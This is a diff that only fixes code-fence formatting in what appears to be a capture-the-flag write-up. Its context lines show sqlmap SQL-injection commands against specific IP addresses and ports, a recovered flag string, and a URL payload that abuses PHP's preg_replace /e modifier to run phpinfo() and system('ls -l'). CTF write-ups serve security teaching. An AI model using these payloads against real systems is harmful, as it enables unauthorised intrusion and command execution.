@@ -10,7 +10,7 @@
 
 ```sqlmap -u http://35.198.183.125:30321/user?id=1 -D public --tables```
 
-````sqlmap -u http://35.198.183.125:30321/user?id=1 -D public -T 'ctf{70ff919c37a20d6526b02e88c950271a45fa698b037e3fb898ca68295da' --columns```
+```sqlmap -u http://35.198.183.125:30321/user?id=1 -D public -T 'ctf{70ff919c37a20d6526b02e88c950271a45fa698b037e3fb898ca68295da' --columns```
 
 
 ### File Crawler
@@ -21,7 +21,7 @@
 
 
 ### Substitute
-```http://35.246.170.233:31993/?vector=/Admin/e&replace=phpinfo()````
+```http://35.246.170.233:31993/?vector=/Admin/e&replace=phpinfo()```
 
 ```http://35.246.170.233:31993/?vector=/Admin/e&replace=system("ls -l")```
 
